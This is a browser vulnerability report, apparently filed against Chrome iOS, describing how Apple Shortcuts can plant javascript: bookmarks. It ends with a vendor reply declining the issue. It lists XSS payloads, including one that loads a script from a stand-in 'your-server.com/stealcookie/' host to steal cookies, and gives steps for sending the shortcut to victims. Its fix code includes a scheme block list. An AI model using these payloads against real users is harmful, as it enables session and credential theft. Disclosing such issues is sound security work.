<h1>VULNERABILITY DETAILS</h1>
<p>This report reveals an XSS vector via <strong>Apple Shortcuts</strong> and <strong>Google Chrome iOS</strong> that allows an attacker to programmatically inject a <code>javascript:</code> payload as a bookmark in Chrome. The inserted bookmark can then execute JavaScript in the context of any active tab when clicked — such as Account.google.com, Gmail, or Facebook — allowing for session theft or UI spoofing, among other critical vulnerabilities.</p>
<p>This vulnerability is possible because Chrome iOS accepts external <code>javascript:</code> URIs via Apple Shorcuts without sanitization or warning. Safari and Edge do not allow this behavior, making the issue isolated to Chrome.</p>

<h1>REPRODUCTION CASE</h1>
<h3>Step 1: Apple Shortcut</h3>
<p><strong>Create a shortcut with the following action:</strong></p>
<p><code>javascript:alert(document.cookie)</code></p>
<p>atau tambahkan url javascript lebih banyak agar potensi eksekusi dari korban lebih besar</p>
<ul>
<li><code>javascript:alert(document.cookie)</code></li>
<li><code>javascript:alert(document.domain)</code></li>
<li><code>javascript:alert(document.location)</code></li>
<li><code>javascript:eval(&#39;var a=document.createElement(\&#39;script\&#39;);a.src=\&#39;https://your-server.com/stealcookie/\&#39;;document.body.appendChild(a)&#39;)</code></li>
</ul>
<h3>Step 2: Deliver to Victim</h3>
<p><strong>Send shortcut to victim via:</strong></p>
<ul>
<li>iCloud Shortcut link</li>
<li>Airdrop</li>
<li>Email</li>
</ul>
<p>Victim runs the shortcut.</p>
<h3>Step 3: Trigger</h3>
<p>Victim browses to any sensitive site (e.g., <code>https://mail.google.com</code> or <code>accounts.google.com</code>) in Chrome iOS.<br>
Then clicks the injected bookmark in the bookmarks bar or mobile menu.</p>
<p><strong>Result:</strong>
JavaScript is executed <strong>in the context of the active tab</strong>.</p>
<hr>
<h2>Impact</h2>
<ul>
<li><code>javascript:</code> payload is silently saved as a bookmark.</li>
<li>Clicking the bookmark while on an active tab runs the JavaScript <strong>in that tab&#39;s origin</strong>.</li>
<li>Enables:
<ol>
<li>Credential theft via <code>document.cookie</code></li>
<li>Full DOM access to active origin</li>
<li>Redirects via <code>location.href</code></li>
<li>Universal XSS</li>
<li>UI spoofing with <code>prompt</code>, <code>alert</code>, etc.</li>
<li>There is no warning from the shortcut or indication to the user from Chrome or Apple Shortcuts that it came from javascript:url.</li>
</ol>
</li>
</ul>
<p>This is <strong>not self-XSS</strong>, as the bookmark is <strong>injected externally</strong> and triggered naturally by the victim (Universal XSS).</p>
<hr>
<h2>Fix Recommendation</h2>
<h3>Chrome iOS</h3>
<p>Validate and sanitize incoming URLs when parsing <code>googlechrome://bookmark?...</code>.</p>
<p><strong>Example Fix:</strong></p>
<pre><code><span class="stx-keyword">function</span> <span>isValidBookmarkUrl</span>(<span>url</span>) {
  <span class="stx-keyword">const</span> <span>disallowedSchemes</span> = [<span class="stx-string">&#39;javascript:&#39;</span>, <span class="stx-string">&#39;data:&#39;</span>, <span class="stx-string">&#39;vbscript:&#39;</span>];
  <span class="stx-keyword">return</span> !disallowedSchemes.some(scheme =&gt; url.toLowerCase().startsWith(scheme));
}

<span class="stx-keyword">if</span> (isValidBookmarkUrl(inputUrl)) {
  saveBookmark(inputUrl);
} <span class="stx-keyword">else</span> {
  alert(<span class="stx-string">&quot;Unsafe URL blocked.&quot;</span>);
}
</code></pre>
<p>Alternative: Block <code>javascript:</code> when coming from external URL, still allow if user manually adds via Chrome interface.</p>
<pre><code><span class="stx-keyword">if</span> (url.startsWith(<span class="stx-string">&quot;javascript:&quot;</span>)) reject();
</code></pre>
<pre><code><span class="stx-keyword">if</span> url.starts(<span class="stx-keyword">with</span>: <span class="stx-string">&quot;javascript:&quot;</span>) {
    rejectBookmark(<span class="stx-string">&quot;Executable code not allowed&quot;</span>);
}
</code></pre>
<h3>Apple Shortcuts</h3>
<p><strong>Apple Shortcuts should:</strong></p>
<p>Prompt user when saving a javascript: URI</p>
<p>Restrict inter-app bookmarks to https/http/file schemes only</p>
<p><strong>Example Prompt:</strong></p>
<pre><code><span class="stx-keyword">if</span> inputURL.scheme == <span class="stx-string">&quot;javascript&quot;</span> {
  promptUser(<span class="stx-string">&quot;This bookmark may be unsafe. Continue?&quot;</span>)
}
</code></pre>
<h2>Why This Is Critical</h2>
<p>Although javascript: bookmarks are known, this abuse vector is novel:</p>
<ul>
<li>
<p>The bookmark is externally inserted without user interaction.</p>
</li>
<li>
<p>Chrome iOS lacks any validation or user prompt.</p>
</li>
<li>
<p>Apple Shortcuts injects it silently without any obvious warning like <code>you are about to add javascript:alert() to bookmarks, are you sure?</code>.</p>
</li>
<li>
<p>Exploit chain is smooth, requiring only a single tap by the victim.</p>
</li>
</ul>
<p>The interaction between Apple Shortcuts and third-party apps presents a new, rarely tested attack surface. This vector shows how automation features can be exploited to inject malicious JavaScript into seemingly safe apps.</p>
<p>*<em>Bookmarks are not just URL storage, they can also be JS trojans if misused.</em></p>

<p>Hi, thanks for the report and the screencast and for proposing an improvement.</p>
<p>From the video, it looks like the user clicks on a well-known mechanism to add a bookmark. The Chrome security guidelines don&#39;t consider running JavaScript from a bookmark to be a vulnerability [1]. I think that reporting the user interface issue to Apple could be useful.
